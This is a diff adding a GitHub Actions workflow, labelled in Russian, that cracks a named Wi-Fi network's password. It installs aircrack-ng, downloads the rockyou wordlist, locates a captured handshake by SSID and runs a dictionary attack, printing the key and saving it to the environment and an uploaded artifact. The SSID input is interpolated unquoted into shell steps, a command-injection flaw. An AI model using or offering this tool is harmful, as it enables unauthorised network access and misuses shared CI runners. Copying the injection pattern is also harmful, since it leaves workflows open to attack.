@@ -1,0 +1,62 @@
+name: "Подбор пароля Wi-Fi"
+
+on:
+  workflow_dispatch:
+    inputs:
+      ssid:
+        description: "Имя сети (SSID)"
+        required: true
+        default: "MyHomeWiFi"
+
+jobs:
+  crack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350   # лимит GitHub: 6 часов на джобу
+
+    steps:
+      - name: Клонируем репозиторий
+        uses: actions/checkout@v4
+
+      - name: Ставим aircrack-ng и словарь
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq aircrack-ng
+          wget -q https://github.com/brannondorsey/wwlists/releases/download/1/rockyou.txt
+          echo "[*] Словарь загружен: $(wc -l < rockyou.txt) паролей"
+
+      - name: Ищем захват по SSID
+        run: |
+          SSID="${{ github.event.inputs.ssid }}"
+          # Ищем файл захвата, где фигурирует этот SSID
+          FOUND=$(for f in captures/*.cap captures/*.pcap captures/*.pcapng; do
+                    [ -f "$f" ] && aircrack-ng "$f" 2>/dev/null | grep -qi "$SSID" && echo "$f" && break
+                  done)
+          if [ -z "$FOUND" ]; then
+            echo "::error::В captures/ нет захвата для сети '$SSID'"
+            exit 1
+          fi
+          echo "CAP=$FOUND" >> $GITHUB_ENV
+          echo "[+] Найден захват: $FOUND для сети $SSID"
+
+      - name: Подбор пароля
+        run: |
+          SSID="${{ github.event.inputs.ssid }}"
+          echo "[*] Запуск подбора для $SSID ..."
+          aircrack-ng -e "$SSID" -w rockyou.txt "$CAP" | tee result.log
+
+          PASSWORD=$(grep -oP '(?<=KEY FOUND! \[    )[^\]]+' result.log | head -1)
+          if [ -n "$PASSWORD" ]; then
+            echo "======================================"
+            echo "  ПАРОЛЬ НАЙДЕН: $PASSWORD"
+            echo "======================================"
+            echo "PASSWORD=$PASSWORD" >> $GITHUB_ENV
+          else
+            echo "[-] Пароль не найден в данном словаре"
+          fi
+
+      - name: Сохраняем результат в артефакт
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: result
+          path: result.log
